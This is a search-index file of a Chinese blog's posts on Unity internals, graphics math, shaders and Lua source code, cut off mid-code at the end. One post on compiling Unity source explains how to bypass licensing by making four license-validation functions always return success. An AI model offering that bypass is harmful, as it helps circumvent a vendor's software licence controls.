var tipuesearch = {"pages":[{"title":"观心苑 – \r\n\t\t关于\r\n","text":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n观心苑 – \r\n\t\t关于\r\n\n\n\n\n\n\n\n\n\n张三\n\n随便写点东西\n\n\n\n\n\n\n首页\n所有\n分类\n标签\n记录\n关于\n\n\n\n\n\n\n这里没什么东西\n联系方式：mail\n项目：英雄杀\n\n\n\n©  2020\n\r\nBuilt with Pelican using Flex theme\r\n \n\n\n\n\n","tags":"","url":"http://www.vmetu.com/about.html"},{"title":"观心苑 – \r\n\t\t记录\r\n","text":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n观心苑 – \r\n\t\t记录\r\n\n\n\n\n\n\n\n\n\n张三\n\n随便写点东西\n\n\n\n\n\n\n首页\n所有\n分类\n标签\n记录\n关于\n\n\n\n\n\n\nTitle: 网络资料\r\nDate: 2100-04-02\r\nCategory: 技术\r\nTags: 网络资料\n[TOC]\n工具\n时区 wiki\n站长工具-Unix 时间戳\n房贷计算器\nUnity\n宣雨松Profile深挖系列\nProfiler深挖-导航条\nProfiler深挖-CPU面板\nProfiler深挖-GPU面板\nProfiler深挖-Rendering面板\nProfiler深挖-Memory面板\nProfiler深挖-UI面板\nProfiler深挖-真机\nlua os.date\nLatex数学符号\n\n\n\n©  2020\n\r\nBuilt with Pelican using Flex theme\r\n \n\n\n\n\n","tags":"","url":"http://www.vmetu.com/recorder.html"},{"title":"PlayerLoop简要流程","text":"PlayerLoop简要流程 PlayerLoop简介 ReentrancyChecker IsWorldPlaying s_defaultLoop PlayerLoopSystem组织方式 ExecutePlayerLoop PlayerLoop简介 PlayerLoop是Unity的主循环，每帧都会跑一次。Unity 2018添加了PlayerLoop相关的API, 我们可以利用如下代码来查看一个PlayerLoop干了那些事： var playerLoop = PlayerLoop . GetDefaultPlayerLoop (); foreach ( var header in playerLoop . subSystemList ) { Debug . LogFormat ( \"------{0}------\" , header . type . Name ); foreach ( var subSystem in header . subSystemList ) { Debug . LogFormat ( \"{0}.{1}\" , header . type . Name , subSystem . type . Name ); } } 会得到一长串的东西： ------Initialization------ Initialization.PlayerUpdateTime Initialization.AsyncUploadTimeSlicedUpdate Initialization.SynchronizeInputs Initialization.SynchronizeState Initialization.XREarlyUpdate ------EarlyUpdate------ EarlyUpdate.PollPlayerConnection //...略 ------FixedUpdate------ FixedUpdate.ClearLines //...略 ------PreUpdate------ //...略 ------Update------ //...略 ------PreLateUpdate------ //...略 ------PostLateUpdate------ //...略 在源码中，PlayerLoop的的入口为 PlayerLoop 函数。 ReentrancyChecker ReentrancyChecker checker ( & s_InsidePlayerLoop ); if ( ! checker . IsOK ()) { //... } 相当于判断 s_InsidePlayerLoop 标志位的一个工具类，基本逻辑： s_InsidePlayerLoop == false 则 IsOk 返回 true , 并把 `s_InsidePlayerLoop 置为 true s_InsidePlayerLoop == false 则 IsOk 返回 false 主要用来防止PlayerLoop出现递归情况。 IsWorldPlaying 这个函数用来判断当前是否是在运行状态。 s_defaultLoop 初始化： static void InitDefaultPlayerLoop () { //... s_defaultLoop . resize_initialized ( 1 + ( PlayerLoopCallbacks :: PLAYER_LOOP_Initialization_COUNT + 1 ) + ( PlayerLoopCallbacks :: PLAYER_LOOP_EarlyUpdate_COUNT + 1 ) + ( PlayerLoopCallbacks :: PLAYER_LOOP_FixedUpdate_COUNT + 1 ) + ( PlayerLoopCallbacks :: PLAYER_LOOP_PreUpdate_COUNT + 1 ) + ( PlayerLoopCallbacks :: PLAYER_LOOP_Update_COUNT + 1 ) + ( PlayerLoopCallbacks :: PLAYER_LOOP_PreLateUpdate_COUNT + 1 ) + ( PlayerLoopCallbacks :: PLAYER_LOOP_PostLateUpdate_COUNT + 1 )); UpdateDefaultPlayerLoop (); s_currentLoop = s_defaultLoop . data (); //... } 大致意思就是初始化这么多的回调，每个回调对应的是 CoreScriptingClasses 中的相应函数。 PlayerLoopSystem组织方式 所有的PlayerLoopSystem保存在 s_currentLoop 中，它内部是一个 NativePlayerLoopSystem 的数组，大致如下： 列表头记录了所有PlayerLoopSystem的个数 每一个PlayerLoopSystem和它的subSystem存在一片连续的区域 PlayerLoopSystem有它的处理逻辑(updateFunction)，并记录了它的subSystem的个数 subSystem中只有处理逻辑 所有的处理逻辑都来自 CoreScriptingClasses 类中 处理函数的命名规则： PlayerLoopSystem为它的名字，例如 CoreScriptingClasses.initialization subSystem的名字为\"PlayerLoopSystem的名字+subSystem的名字\", 例如 CoreScriptingClasses.initializationPlayerUpdateTime 命名通过 PLAYER_LOOP_INJECT(Name) 宏定义 处理函数的初始化定义在 CoreScriptingClasses.InitializeCoreScriptingClasses , 从dll中加载。 ExecutePlayerLoop 首先判断本个NativePlayerLoopSystem要不要再当前帧执行： while ( ! system -> loopConditionFunction || system -> loopConditionFunction ()) {...} 例如FixedUpdateCondition就限制了只有在与上次执行相隔大于一定时间才可以执行。 //如果有系统的处理函数 if ( childSystem -> updateFunction ) { if ( * childSystem -> updateFunction ) ( * childSystem -> updateFunction )(); //Start，Update之类的就是从这里进来的 } //再看是不是通过SetPlayerLoop设置了用户自定义的处理 else if ( ! childSystem -> delegateInvokeMethod . IsNull ()) { //... } //执行下一个PlayerLoopSystem else { // Execute all the child systems children recursivly and skip them in this loop ExecutePlayerLoop ( childSystem ); childSystemIndex += childSystem -> numSubSystems ; childSystem += childSystem -> numSubSystems ; } 使用如下代码可以在系统的update前加入我们自己的些处理： [RuntimeInitializeOnLoadMethod] static void OnRuntimeMethodLoad () { PlayerLoopSystem hackSystem = new PlayerLoopSystem () { type = typeof ( MyUpdateHacker ), updateDelegate = () => { Debug . Log ( \"=========hi, I'm hacking\" ); }, }; PlayerLoopSystem playerLoop = PlayerLoop . GetDefaultPlayerLoop (); PlayerLoopSystem updateSystem = playerLoop . subSystemList [ 4 ]; List < PlayerLoopSystem > subSystem = new List < PlayerLoopSystem >( updateSystem . subSystemList ); subSystem . Insert ( 0 , hackSystem ); playerLoop . subSystemList [ 4 ]. subSystemList = subSystem . ToArray (); PlayerLoop . SetPlayerLoop ( playerLoop ); } public struct MyUpdateHacker { }","tags":"编程语言","url":"http://www.vmetu.com/blog/playerloopjian-yao-liu-cheng.html","loc":"http://www.vmetu.com/blog/playerloopjian-yao-liu-cheng.html"},{"title":"Unity源码编译","text":"编译 我的源码是2018.4.4版本 安装32位的perl 安装vs2017 源码目录运行 perl build.pl -prepare 使用vs2017打开 Projects\\VisualStudio\\AllTargets.sln , 编译运行 跳过授权 使用现有Unity授权文件, 位于 C:\\ProgramData\\Unity\\Unity_lic.ulf , 然后更改如下几个授权判断的函数： int LicenseInfo :: ValidateDates ( TiXmlDocument & doc ); int LicenseInfo :: ValidateMachineBindings ( TiXmlDocument & doc ); bool LicenseInfo :: ValidateLicenseType ( TiXmlDocument & doc ); bool LicenseInfo :: ValidateLicenseDocument ( TiXmlDocument & doc , const core :: string & licenseData ); 将这几个函数直接返回验证通过的值就可以了。","tags":"编程语言","url":"http://www.vmetu.com/blog/unityyuan-ma-bian-yi.html","loc":"http://www.vmetu.com/blog/unityyuan-ma-bian-yi.html"},{"title":"计算机图形学笔记——透视矩阵推导","text":"透视矩阵推导 计算机图形学笔记——透视矩阵推导 透视矩阵推导 如图： \\(O\\) 点为摄像机所在位置， \\(n\\) 为近剪裁面的距离， \\(f\\) 为远建材面的距离， \\(P\\) 为视锥体中的一个点， \\(P'\\) 为 \\(P\\) 在近建材面的一个投影。透视投影矩阵要把位于视锥体内的物体的顶点 \\(x,y,z\\) 坐标缩放到 \\([-1,1]\\) 范围。这就相当于把这个四棱台扭曲变形成一个立方体。 我们要推导的就是 \\(P'\\) 缩放后的坐标 \\(P''\\) 。 设 \\(P(x, y, z), P'(x', y', z'), fov=2\\theta\\) , 可推导： $$ \\frac{x}{x'} =\\frac{z}{n} \\quad \\Rightarrow \\quad x'= \\frac{nx}{z} $$ 同理： $$ y' = \\frac{ny}{z} \\\\ z' = n $$ 设 \\(P\\rightarrow P'\\) 的变换矩阵为 \\(M\\) , \\(P'\\rightarrow P''\\) 的变换矩阵为 \\(N\\) , 有： $$ M\\cdot \\begin{bmatrix}x\\\\y\\\\z\\\\1\\end{bmatrix} = \\begin{bmatrix}x'\\\\y'\\\\z'\\\\1\\end{bmatrix} \\quad \\quad \\quad N\\cdot \\begin{bmatrix}x'\\\\y'\\\\z'\\\\1\\end{bmatrix} = \\begin{bmatrix}x''\\\\y''\\\\z''\\\\1\\end{bmatrix} $$","tags":"计算机图形学","url":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-tou-shi-ju-zhen-tui-dao.html","loc":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-tou-shi-ju-zhen-tui-dao.html"},{"title":"计算机图形学笔记——Tilemap中获取点击的瓦片坐标","text":"Tilemap中获取点击的瓦片坐标 计算机图形学笔记——Tilemap中获取点击的瓦片坐标 Tilemap中获取点击的瓦片坐标 原理 代码 原理 通过摄像机和屏幕空间中的点画一条射线，该射线与Tilemap相交的点可以认为是点击到的点。我们将其转换为一个数学问题，如图： \\(C\\) 为射线的起点， \\(\\vec m\\) 为射线的单位向量， \\(O\\) 为平面上的一个点， \\(\\vec n\\) 为平面的单位法向量，求射线与平面的交点 \\(P\\) 。 推导过程： $$ \\vec {CP} = d \\ast \\vec m \\tag 1 $$ 因为 \\(\\vec n\\) 为平面法向量，有： $$ \\vec {OP} \\cdot \\vec n = 0 \\tag 2 $$ 其中： $$ \\vec {OP} = \\vec {OC} + \\vec {CP} \\tag 3 $$ 结合上面三个等式可推导: $$ (\\vec {OC} + \\vec {CP})\\cdot \\vec n = 0 \\\\ \\vec {OC} \\cdot \\vec n + \\vec {CP} \\cdot \\vec n = 0\\\\ \\vec {OC} \\cdot \\vec n + d \\ast \\vec m \\cdot \\vec n = 0\\\\ d = - \\frac{\\vec {OC} \\cdot \\vec n}{\\vec m \\cdot \\vec n} $$ 可得： $$ P = \\vec {OP} + O = \\vec {OC} + \\vec {CP} + O= \\vec {OC} + d \\ast \\vec m + O= C -\\frac{\\vec {OC} \\cdot \\vec n}{\\vec m \\cdot \\vec n} \\cdot \\vec m $$ 或： $$ P = \\vec {CP} + C = d \\ast \\vec m + C = C -\\frac{\\vec {OC} \\cdot \\vec n}{\\vec m \\cdot \\vec n} \\cdot \\vec m $$ 代码 using System.Collections ; using System.Collections.Generic ; using UnityEngine ; public class TestTileMap : MonoBehaviour { public Camera renderCamera ; public GameObject zero ; //tileMap的法向量 public Vector3 tileMapNormal ; private Grid _grid = null ; //tilemap上某个点的世界坐标, 设为O点 private Vector3 _O ; private Vector3 _C ; private Vector3 _n ; //tilemap的法向量 private void Start () { _grid = GetComponent < Grid >(); } void Update () { if ( Input . GetMouseButtonDown ( 0 )) { //O点使用tilemap的世界坐标 _O = transform . position ; Debug . Log ( \"O: \" + _O ); //C点为摄像机 _C = renderCamera . transform . position ; Debug . Log ( \"C: \" + _C ); //手动设置的法向量 _n = tileMapNormal ; Debug . Log ( \"n: \" + _n ); Vector3 nearClipScreenPos = new Vector3 ( Input . mousePosition . x , Input . mousePosition . y , renderCamera . nearClipPlane ); Vector3 nearClipWorldPos = Camera . main . ScreenToWorldPoint ( nearClipScreenPos ); //摄像机到点击位置的射线 Vector3 m = ( nearClipWorldPos - _C ). normalized ; Debug . Log ( \"m: \" + m ); //向量OC Vector3 oc = _C - _O ; Debug . Log ( \"oc: \" + oc ); float d = Vector3 . Dot ( oc , _n ) / Vector3 . Dot ( m , _n ); Debug . Log ( \"d: \" + d ); //向量OP Vector3 op = oc - d * m ; Debug . Log ( \"op: \" + op ); //P点 Vector3 p = _O + op ; Debug . Log ( \"p: \" + p ); // 将世界坐标转换为瓦片坐标 Vector3Int cellPos = _grid . WorldToCell ( p ); Debug . Log ( \"cellPos:\" + cellPos ); } } }","tags":"计算机图形学","url":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-tilemapzhong-huo-qu-dian-ji-de-wa-pian-zuo-biao.html","loc":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-tilemapzhong-huo-qu-dian-ji-de-wa-pian-zuo-biao.html"},{"title":"计算机图形学笔记——卷积和边缘检测","text":"积和边缘检测 @(计算机图形学)[学习笔记] [TOC]","tags":"计算机图形学","url":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-juan-ji-he-bian-yuan-jian-ce.html","loc":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-juan-ji-he-bian-yuan-jian-ce.html"},{"title":"使用stencil实现mask功能","text":"代码 Shader \"Custom/StencilMask\" { Properties { _MainTex ( \"Albedo (RGB)\" , 2 D ) = \"white\" {} _StencilRef ( \"StencilRef\" , Float ) = 0 } SubShader { Tags { \"RenderType\" = \"Transparent\" } Blend SrcAlpha OneMinusSrcAlpha Pass { Stencil { Ref [ _StencilRef ] Comp Always Pass Replace } CGPROGRAM #pragma vertex vert #pragma fragment frag #include \"Lighting.cginc\" sampler2D _MainTex ; float4 _MainTex_ST ; struct a2v { float4 vertex : POSITION ; float4 texcoord : TEXCOORD0 ; }; struct v2f { float4 pos : SV_POSITION ; float2 uv : TEXCOORD0 ; }; v2f vert ( a2v v ) { v2f o ; o . pos = UnityObjectToClipPos ( v . vertex ); o . uv = TRANSFORM_TEX ( v . texcoord , _MainTex ); return o ; } fixed4 frag ( v2f i ) : SV_Target { fixed4 color = tex2D ( _MainTex , i . uv ). rgba ; //只有白色部分的stencil有效 half3 delta = abs ( color . rgb - fixed3 ( 0.0 , 0.0 , 0.0 )); if ( length ( delta ) < 1 ) { discard ; } //用于控制是否显示mask图片 color . a = 0.5 ; return color ; } ENDCG } } FallBack off }","tags":"计算机图形学","url":"http://www.vmetu.com/blog/shi-yong-stencilshi-xian-maskgong-neng.html","loc":"http://www.vmetu.com/blog/shi-yong-stencilshi-xian-maskgong-neng.html"},{"title":"lua源码阅读3——table","text":"lua源码阅读3——table Table结构体 节点的结构 table的大小 创建 创建table 创建key 查 主入口 查找key为短字符串的值 ​ Table结构体 typedef struct Table { CommonHeader ; lu_byte flags ; /* 1<<p means tagmethod(p) is not present */ lu_byte lsizenode ; /* log2 of size of 'node' array */ unsigned int sizearray ; /* size of 'array' array */ TValue * array ; /* array part */ Node * node ; //具有同一hash值的节点桶列表 Node * lastfree ; /* any free position is before this position */ struct Table * metatable ; GCObject * gclist ; } Table ; 节点的结构 typedef struct Node { TValue i_val ; TKey i_key ; } Node ; 一个节点包含一个key和value。我们主要来看看TKey: typedef union TKey { struct { TValuefields ; int next ; /* for chaining (offset for next node) */ } nk ; //代表着一个链表 TValue tvk ; //代表着一个值 } TKey ; table的大小 /* ** Try to find a boundary in table 't'. A 'boundary' is an integer index ** such that t[i] is non-nil and t[i+1] is nil (and 0 if t[1] is nil). */ lua_Unsigned luaH_getn ( Table * t ) { unsigned int j = t -> sizearray ; if ( j > 0 && ttisnil ( & t -> array [ j - 1 ])) { /* there is a boundary in the array part: (binary) search for it */ unsigned int i = 0 ; //二分查找最后一个不是nil的value，i=value其下标+1，也就是个数 while ( j - i > 1 ) { unsigned int m = ( i + j ) / 2 ; //保证j-1始终为nil, 如果数组全为nil，最终j=1, i=0 if ( ttisnil ( & t -> array [ m - 1 ])) j = m ; else i = m ; //如果移动过i，i-1始终不为nil } return i ; } /* else must find a boundary in hash part */ else if ( isdummy ( t )) /* hash part is empty? */ return j ; /* that is easy... */ else return unbound_search ( t , j ); } 这个函数用来获取table中的数组大小，用在tabe的 # 运算上。我们注意到，它是通过二分查找来找的，就会导致一个有趣的现象： # { 0 , 1 , 2 , 3 , 4 , 5 , nil } == 6 # { 0 , 1 , 2 , nil , 4 , 5 , nil } == 6 # { 0 , 1 , nil , 3 , 4 , 5 , nil } == 2 因为二分法的步长把3号位的nil跳过去了。 当最后一个元素不是nil时，使用的是 unbound_search 来获取大小，它的本质还是一个二分查找： static lua_Unsigned unbound_search ( Table * t , lua_Unsigned j ) { lua_Unsigned i = j ; /* i is zero or a present index */ j ++ ; //以2的幂次方为步长，找到一个为nil的下标 /* find 'i' and 'j' such that i is present and j is not */ while ( ! ttisnil ( luaH_getint ( t , j ))) { i = j ; if ( j > l_castS2U ( LUA_MAXINTEGER ) / 2 ) { /* overflow? */ /* table was built with bad purposes: resort to linear search */ i = 1 ; while ( ! ttisnil ( luaH_getint ( t , i ))) i ++ ; return i - 1 ; } j *= 2 ; } //在i和i*2的区间进行二分查找 /* now do a binary search between them */ while ( j - i > 1 ) { lua_Unsigned m = ( i + j ) / 2 ; if ( ttisnil ( luaH_getint ( t , m ))) j = m ; else i = m ; } return i ; } 通过这部分源代码我们可以看出来，lua认为nil为一个数组的结尾，为了不出现意外的情况，我们在建立数组时， 数组里面的值最好不要有nil 。 创建 创建table Table * luaH_new ( lua_State * L ) { GCObject * o = luaC_newobj ( L , LUA_TTABLE , sizeof ( Table )); Table * t = gco2t ( o ); t -> metatable = NULL ; t -> flags = cast_byte ( ~ 0 ); //flag初始化应该为255， t -> array = NULL ; t -> sizearray = 0 ; setnodevector ( L , t , 0 ); return t ; } 创建key /* ** inserts a new key into a hash table; first, check whether key's main ** position is free. If not, check whether colliding node is in its main ** position or not: if it is not, move colliding node to an empty place and ** put new key in its main position; otherwise (colliding node is in its main ** position), new key goes to an empty position. */ TValue * luaH_newkey ( lua_State * L , Table * t , const TValue * key ) { Node * mp ; TValue aux ; //检查key是否为nil, 并看能不能将float的key转成int的key ... mp = mainposition ( t , key ); if ( ! ttisnil ( gval ( mp )) || isdummy ( t )) { /* main position is taken? */ Node * othern ; Node * f = getfreepos ( t ); /* get a free place */ if ( f == NULL ) { /* cannot find a free place? */ rehash ( L , t , key ); /* grow table */ /* whatever called 'newkey' takes care of TM cache */ return luaH_set ( L , t , key ); /* insert key into grown table */ } lua_assert ( ! isdummy ( t )); othern = mainposition ( t , gkey ( mp )); if ( othern != mp ) { /* is colliding node out of its main position? */ /* yes; move colliding node into free position */ while ( othern + gnext ( othern ) != mp ) /* find previous */ othern += gnext ( othern ); gnext ( othern ) = cast_int ( f - othern ); /* rechain to point to 'f' */ * f = * mp ; /* copy colliding node into free pos. (mp->next also goes) */ if ( gnext ( mp ) != 0 ) { gnext ( f ) += cast_int ( mp - f ); /* correct 'next' */ gnext ( mp ) = 0 ; /* now 'mp' is free */ } setnilvalue ( gval ( mp )); } else { /* colliding node is in its own main position */ /* new node will go into free position */ if ( gnext ( mp ) != 0 ) gnext ( f ) = cast_int (( mp + gnext ( mp )) - f ); /* chain new position */ else lua_assert ( gnext ( f ) == 0 ); gnext ( mp ) = cast_int ( f - mp ); mp = f ; } } setnodekey ( L , & mp -> i_key , key ); luaC_barrierback ( L , t , key ); lua_assert ( ttisnil ( gval ( mp ))); return gval ( mp ); } 查 主入口 /* ** main search function */ const TValue * luaH_get ( Table * t , const TValue * key ) { //根据key的类型调用不同的函数来查找 switch ( ttype ( key )) { case LUA_TSHRSTR : return luaH_getshortstr ( t , tsvalue ( key )); case LUA_TNUMINT : return luaH_getint ( t , ivalue ( key )); case LUA_TNIL : return luaO_nilobject ; case LUA_TNUMFLT : { lua_Integer k ; //将float的key转成int，如果floor(key) != int(key),则进入defaut if ( luaV_tointeger ( key , & k , 0 )) /* index is int? */ return luaH_getint ( t , k ); /* use specialized version */ /* else... */ } /* FALLTHROUGH */ default : //通用查找 return getgeneric ( t , key ); } } 在这里我们看到一个比较有趣的地方，即在lua中，肯定有 t[2.0] == t[2] , 由于各机器上 double 是有精度限制的，如果 10 == 10.0000000000000001 ， 那么 t[10] == t[10.0000000000000001] 。 查找key为短字符串的值 /* ** search function for short strings */ const TValue * luaH_getshortstr ( Table * t , TString * key ) { Node * n = hashstr ( t , key ); //根据短字符串的哈希值找到桶 lua_assert ( key -> tt == LUA_TSHRSTR ); for (;;) { /* check whether 'key' is somewhere in the chain */ const TValue * k = gkey ( n ); if ( ttisshrstring ( k ) && eqshrstr ( tsvalue ( k ), key )) return gval ( n ); /* that's it */ else { int nx = gnext ( n ); if ( nx == 0 ) return luaO_nilobject ; /* not found */ n += nx ; } } }","tags":"lua源码阅读","url":"http://www.vmetu.com/blog/luayuan-ma-yue-du-3-table.html","loc":"http://www.vmetu.com/blog/luayuan-ma-yue-du-3-table.html"},{"title":"lua源码阅读1——源码编译","text":"下载 lua源码 源码地址：http://www.lua.org/versions.html， 本次阅读使用的版本是5.3.5 将src文件夹导入vs， 我使用的是vs2015。除了lua.c和luac.c全部include进工程。 编译。我的工程地址：https://github.com/shazi129/LuaSourceCode.git 这里是我的测试代码： #include <stdio.h> #include \"./../src/lua.h\" int main () { char lua [] = \"local a = 1 \\n \" \\ \"local b = 2 \\n \" \\ \"print (string.format( \\\" a+b=%d \\\" , a+b))\" ; lua_State * lstate = luaL_newstate (); luaL_openlibs ( lstate ); if ( luaL_loadstring ( lstate , lua ) || lua_pcall ( lstate , 0 , 0 , 0 )) { printf ( \"error: %s \\n \" , lua_tostring ( lstate , - 1 )); } lua_close ( lstate ); system ( \"pause\" ); return 0 ; }","tags":"lua源码阅读","url":"http://www.vmetu.com/blog/luayuan-ma-yue-du-1-yuan-ma-bian-yi.html","loc":"http://www.vmetu.com/blog/luayuan-ma-yue-du-1-yuan-ma-bian-yi.html"},{"title":"lua源码阅读2——string","text":"lua源码阅读2——string 字符串部分对外接口 字符串的结构体 长字符串和短字符串 短字符串的组织方式 字符串索引初始化 短字符串散列表的建立 字符串哈希算法 长字符串的哈希算法 随机数种子seed 字符串的创建 创建入口 创建字符串。 长字符串的创建 短字符串创建 通用创建过程： 短字符串的删除 字符串比较 字符串部分对外接口 //计算一段buff的哈希值 LUAI_FUNC unsigned int luaS_hash ( const char * str , size_t l , unsigned int seed ); //计算长字符串的哈希值 LUAI_FUNC unsigned int luaS_hashlongstr ( TString * ts ); //比较字长符串 LUAI_FUNC int luaS_eqlngstr ( TString * a , TString * b ); //重新分配散列桶的大小 LUAI_FUNC void luaS_resize ( lua_State * L , int newsize ); //清理字符串的cache LUAI_FUNC void luaS_clearcache ( global_State * g ); //初始化短字符散列表和长字符cache LUAI_FUNC void luaS_init ( lua_State * L ); //删除一个短字符串 LUAI_FUNC void luaS_remove ( lua_State * L , TString * ts ); //创建字符串 LUAI_FUNC TString * luaS_newlstr ( lua_State * L , const char * str , size_t l ); //创建字符串，先从所以中找，然后luaS_newlstr创建 LUAI_FUNC TString * luaS_new ( lua_State * L , const char * str ); //创建长字符串 LUAI_FUNC TString * luaS_createlngstrobj ( lua_State * L , size_t l ); 字符串的结构体 /* ** Header for string value; string bytes follow the end of this structure ** (aligned according to 'UTString'; see next). */ typedef struct TString { CommonHeader ; //标识是否是lua关键字，长字符串是否哈希等信息 lu_byte extra ; /* reserved words for short strings; \"has hash\" for longs */ //短字符串的长度 lu_byte shrlen ; /* length for short strings */ //字符串哈希值 unsigned int hash ; //短字符串才有链表，所以用可以用union表示两种信息 union { //长字符串的长度 size_t lnglen ; /* length for long strings */ //短字符串的链表(一个链表的字符串哈希值都相同) struct TString * hnext ; /* linked list for hash table */ } u ; } TString ; 在创建字符串时，会申请 sizeof(TString) + 字符串实际长度 + 1 的内存空间，头部存 TString ,后面跟着字符串内容。 长字符串和短字符串 Lua 5.3引入了长字符串和短字符串的概念，它们按长度区分，定义在： /* ** Maximum length for short strings, that is, strings that are ** internalized. (Cannot be smaller than reserved words or tags for ** metamethods, as these strings must be internalized; ** #(\"function\") = 8, #(\"__newindex\") = 10.) */ #if !defined(LUAI_MAXSHORTLEN) #define LUAI_MAXSHORTLEN 40 #endif Lua中所有关键词都被认为是短字符串，最长的应该是\"__newindex\"，所以 LUAI_MAXSHORTLEN 不应小于10。 Lua中所有的短字符串均被存放在全局状态表（global_State）的 strt 域中， strt 是 stringtable 的简写，它是一个哈希表。 短字符串的组织方式 Lua中所有的短字符串均被存放在全局状态表（global_State）的 strt 域中， strt 是 stringtable 的简写，它是一个哈希表。 strt 的定义： typedef struct stringtable { TString ** hash ; int nuse ; //表里的字符串的个数 int size ; //size是这个表的散列桶的个数 } stringtable ; 表的结构如下图(参考：https://www.cnblogs.com/heartchord/p/4561308.html)： 在Lua初始化的时候会调用 luaS_init 来初始化短字符串的哈希表。 字符串索引初始化 /* ** Initialize the string table and the string cache */ void luaS_init ( lua_State * L ) { global_State * g = G ( L ); int i , j ; //创建短字符串的散列表 luaS_resize ( L , MINSTRTABSIZE ); /* initial size of string table */ /* pre-create memory-error message */ g -> memerrmsg = luaS_newliteral ( L , MEMERRMSG ); luaC_fix ( L , obj2gco ( g -> memerrmsg )); /* it should never be collected */ //字符串缓冲，用于提高字符串的访问。STRCACHE_N为索引的个数,STRCACHE_M为有相同索引元素的个数 for ( i = 0 ; i < STRCACHE_N ; i ++ ) /* fill cache with valid strings */ for ( j = 0 ; j < STRCACHE_M ; j ++ ) g -> strcache [ i ][ j ] = g -> memerrmsg ; } 短字符串散列表的建立 /* ** resizes the string table */ void luaS_resize ( lua_State * L , int newsize ) { int i ; stringtable * tb = & G ( L ) -> strt ; if ( newsize > tb -> size ) { /* grow table if needed */ //将tb->hash的数量从tb->size增加到newsize luaM_reallocvector ( L , tb -> hash , tb -> size , newsize , TString * ); for ( i = tb -> size ; i < newsize ; i ++ ) //新创建的初始值为NULL tb -> hash [ i ] = NULL ; } for ( i = 0 ; i < tb -> size ; i ++ ) { /* rehash */ TString * p = tb -> hash [ i ]; tb -> hash [ i ] = NULL ; while ( p ) { /* for each node in the list */ /* * 这段是这样处理的 * 初始： * p -> [1] ->[2] -> [3] * h -> [5] ->[6] -> [7] * 处理后 * p ->[2] -> [3] * h ->[1] -> [5] ->[6] -> [7] */ TString * hnext = p -> u . hnext ; /* save next */ unsigned int h = lmod ( p -> hash , newsize ); /* new position */ p -> u . hnext = tb -> hash [ h ]; /* chain it */ tb -> hash [ h ] = p ; p = hnext ; } } //假如是缩表, 因为经过上面的处理，后面的桶肯定是空了 if ( newsize < tb -> size ) { /* shrink table if needed */ /* vanishing slice should be empty */ lua_assert ( tb -> hash [ newsize ] == NULL && tb -> hash [ tb -> size - 1 ] == NULL ); luaM_reallocvector ( L , tb -> hash , tb -> size , newsize , TString * ); } tb -> size = newsize ; } 字符串哈希算法 /* ** Lua will use at most ~(2&#94;LUAI_HASHLIMIT) bytes from a string to ** compute its hash */ #if !defined(LUAI_HASHLIMIT) #define LUAI_HASHLIMIT 5 #endif unsigned int luaS_hash ( const char * str , size_t l , unsigned int seed ) { unsigned int h = seed &#94; cast ( unsigned int , l ); size_t step = ( l >> LUAI_HASHLIMIT ) + 1 ; for (; l >= step ; l -= step ) h &#94;= (( h << 5 ) + ( h >> 2 ) + cast_byte ( str [ l - 1 ])); return h ; } LUAI_HASHLIMIT 算哈希值的最多的字节数，5表示32，主要用来获得计算步长 step 。c语言中常用位移来代替乘除用以提高效率(参考二进制的位移和乘除运算)。实际就是: step = 字符串长度 / 32 + 1 一些常见的哈希算法https://blog.csdn.net/chenguolinblog/article/details/7833794 Lua中使用了随机生成的 seed 来保证哈希值不被猜测 长字符串的哈希算法 unsigned int luaS_hashlongstr ( TString * ts ) { lua_assert ( ts -> tt == LUA_TLNGSTR ); if ( ts -> extra == 0 ) { /* no hash? */ //作为参数传进去的ts->hash就是随机种子 ts -> hash = luaS_hash ( getstr ( ts ), ts -> u . lnglen , ts -> hash ); ts -> extra = 1 ; /* now it has its hash */ } return ts -> hash ; } 随机数种子seed Lua中生成随机数种子的逻辑： /* ** a macro to help the creation of a unique random seed when a state is ** created; the seed is used to randomize hashes. */ #if !defined(luai_makeseed) #include <time.h> #define luai_makeseed() cast(unsigned int, time(NULL)) #endif /* ** Compute an initial seed as random as possible. Rely on Address Space ** Layout Randomization (if present) to increase randomness.. */ #define addbuff(b,p,e) \\ { size_t t = cast(size_t, e); \\ memcpy(b + p, &t, sizeof(t)); p += sizeof(t); } static unsigned int makeseed ( lua_State * L ) { char buff [ 4 * sizeof ( size_t )]; unsigned int h = luai_makeseed (); int p = 0 ; //在这buff中写入各种变量的地址 addbuff ( buff , p , L ); /* heap variable */ addbuff ( buff , p , & h ); /* local variable */ addbuff ( buff , p , luaO_nilobject ); /* global variable */ addbuff ( buff , p , & lua_newstate ); /* public function */ lua_assert ( p == sizeof ( buff )); return luaS_hash ( buff , p , h ); } luai_makeseed 返回当前时间戳 算法以当前时间戳为种子，哈希一段存了各种地址的buff，以得到的哈希值为随机数种子。如果在调试的时候想得到固定一致的哈希值，可以自定义 luai_makeseed 函数 字符串的创建 创建入口 /* ** Create or reuse a zero-terminated string, first checking in the ** cache (using the string address as a key). The cache can contain ** only zero-terminated strings, so it is safe to use 'strcmp' to ** check hits. */ TString * luaS_new ( lua_State * L , const char * str ) { //先在缓冲中找，缓冲以字符串地址为索引，最多有STRCACHE_N(53)个索引 unsigned int i = point2uint ( str ) % STRCACHE_N ; /* hash */ int j ; TString ** p = G ( L ) -> strcache [ i ]; //每个索引下可以有STRCACHE_M(2)个字符串，命中后直接返回 for ( j = 0 ; j < STRCACHE_M ; j ++ ) { if ( strcmp ( str , getstr ( p [ j ])) == 0 ) /* hit? */ return p [ j ]; /* that is it */ } //没在缓冲中找到的话，在使用常规的方法查找或是创建字符串，得到字符串后，放到缓冲中 /* normal route */ for ( j = STRCACHE_M - 1 ; j > 0 ; j -- ) p [ j ] = p [ j - 1 ]; /* move out last element */ /* new element is first in the list */ p [ 0 ] = luaS_newlstr ( L , str , strlen ( str )); return p [ 